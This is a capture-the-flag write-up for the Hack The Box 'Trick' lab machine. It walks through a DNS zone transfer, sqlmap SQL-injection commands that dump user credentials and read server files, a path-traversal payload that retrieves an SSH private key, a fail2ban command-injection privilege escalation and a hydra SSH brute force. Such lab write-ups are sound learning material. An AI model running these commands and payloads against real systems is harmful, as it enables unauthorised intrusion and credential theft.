Hack The Box: trick

IP = 10.129.87.146

Nmap -Scan

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Port 80 is running a static web page

Port 53 is open as tcp port. Which is lead to dns zone transfer
Before start doing zone transfer we need to get the HOSTNAME

Reverse DNS lookup using Nslookup tool

```bash
nslookup                                         
> server 10.129.87.146
Default server: 10.129.87.146
Address: 10.129.87.146#53
> 10.129.87.146
146.87.129.10.in-addr.arpa	name = trick.htb.
```
found the domain name **trick.htb**

Zone Transfer using dig tool

```bash
dig axfr @10.129.87.146 trick.htb

; <<>> DiG 9.16.27-Debian <<>> axfr @10.129.87.146 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 906 msec
;; SERVER: 10.129.87.146#53(10.129.87.146)
;; WHEN: Sun Jun 19 05:32:23 GMT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

found the subdomain **preprod-payroll.trick.htb**

"In this web app their are two vuln firstone is bypassing the login using response manupulation
and the anotherone is union based sql injection on login parameter and id parameter in a employeemanagement edit 
funtion"

Sql injection UNION BASED 

identifying
```bash
sqlmap -u http://preprod-payroll.trick.htb/manage_employee.php?id=1 -dbs
````
extract database tables
```bash
sqlmap -u 'http://preprod-payroll.trick.htb/manage_employee.php?id=1' -dbs -D payroll_db --tables
````
extract users tables columns in payroll_db
```bash
sqlmap -u 'http://preprod-payroll.trick.htb/manage_employee.php?id=1' -dbs -D payroll_db -T users --columns
```
Dump the username from payroll_db.users
```bash
sqlmap -u 'http://preprod-payroll.trick.htb/manage_employee.php?id=1' -dbs -D payroll_db -T users -C username --dump
```
Username:Enemigosss

Dump the password from payroll_db.users
```bash
sqlmap -u 'http://preprod-payroll.trick.htb/manage_employee.php?id=1' -dbs -D payroll_db -T users -C password --dump
```
Password:SuperGucciRainbowCake

Check the database user username and privilege
```bash
sqlmap -u 'http://preprod-payroll.trick.htb/manage_employee.php?id=1' --current-user 
```
user:remo
```bash
sqlmap -u 'http://preprod-payroll.trick.htb/manage_employee.php?id=1' --privileges
````
privilege:FILE

"The file privilege gives you permission to read and write files on the server using the LOAD DATA INFILE and SELECT ... INTO OUTFILE statements. Any user to whom this privilege is granted can read or write any file that the MySQL server can read or write. The reload command tells the server to re-read the grant tables."

Reading server files

```bash
sqlmap -u http://preprod-payroll.trick.htb/manage_employee.php?id=1' --file-read=/etc/passwd
````
Check nginx site config for vhosts

```bash
sqlmap -u http://preprod-payroll.trick.htb/manage_employee.php?id=1' --file-read=/etc/nginx/sites-available/default
```
Found an another domain 

**preprod-marketing.trick.htb**

bypass the lfi security measure and got the ssh key
```bash
http://preprod-marketing.trick.htb/index.php?page=services.html
```
**payload=....//....//....//home/michael/.ssh/id_rsa***


Root Part :abusing fail2ban

default fail2ban config file location **/etc/fail2ban/**

"every 3 minute their is a cronjonb running to remove all file in fail2ban dir and cp default files again
The jail set to sshd in /etc/fail2ban/jail.conf
every ten second after 5 failed attempt the ssh login ip will be block"

Exploit

create a new config file in /etc/fail2ban/action.d/

create a new config file in /etc/fail2ban/action.d/

iptables-multiport.conf to iptables-multiport.local

injection system command in actionban parameter in iptables-multiport.local 

restart fail2ban service

bruteforce ssh using hydra
```bash
hydra -l remo -P /opt/rockyou.txt 10.129.35.174 ssh
```